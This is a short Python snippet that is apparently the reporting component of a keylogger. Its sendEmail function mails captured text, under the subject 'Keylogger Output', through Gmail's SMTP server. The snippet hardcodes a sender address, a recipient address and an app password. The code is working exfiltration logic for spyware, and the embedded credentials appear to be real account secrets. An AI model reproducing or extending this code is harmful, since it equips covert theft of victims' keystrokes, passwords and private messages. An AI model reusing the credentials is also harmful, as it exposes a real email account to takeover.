import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def sendEmail(message):
    # Email configuration
    sender_email = "abhishekiyer2003@gmail.com"
    receiver_email = "test.qip.project@gmail.com"  # Replace with the recipient's email
    password = "drxa wqag wsnj jzqj"  # Replace with your email account password

    # Create a multipart message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Keylogger Output"

    # Add message body
    msg.attach(MIMEText(message, 'plain'))

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:  # Use the appropriate SMTP server
            server.starttls()  # Upgrade the connection to secure
            server.login(sender_email, password)  # Log in to your email account
            server.send_message(msg)  # Send the email
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
this is the updated code
